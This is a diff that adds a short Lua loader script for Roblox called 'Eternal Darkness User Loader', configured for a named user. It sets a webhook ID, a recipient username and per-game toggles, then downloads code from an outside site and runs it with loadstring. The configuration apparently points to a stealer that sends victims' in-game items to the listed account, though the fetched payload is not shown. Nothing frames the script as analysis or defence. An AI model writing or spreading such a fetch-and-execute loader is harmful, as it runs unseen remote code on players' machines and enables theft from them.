@@ -1,0 +1,22 @@
+-- Eternal Darkness User Loader v7.0
+-- Generated for: garlicmayo64
+-- File ID: d3ae324fa05054b52df8ac71bf6e69e9
+
+_G.ED_CONFIG = {
+    WEBHOOK_ID = "849bdb193fb3ec86be3404eab0b3b095",
+    USERNAMES = {"jacobpro728"},
+    PROXY_URL = "https://eternal-darkness.org/proxy/",
+    USERNAME = "garlicmayo64",
+    ENABLED_GAMES = {["mm2"]=false,["ps99"]=true,["adm"]=false,["sab"]=false,["sp"]=false,["bb"]=false,},
+    CUSTOM_SCRIPTS = {}
+}
+
+local MainLoaderUrl = "https://eternal-darkness.org/api/loader"
+local Success, Result = pcall(function()
+    return game:HttpGet(MainLoaderUrl, true)
+end)
+if not Success or not Result or #Result == 0 then
+    warn("[ED] Failed to load Main Loader")
+    return
+end
+loadstring(Result)()
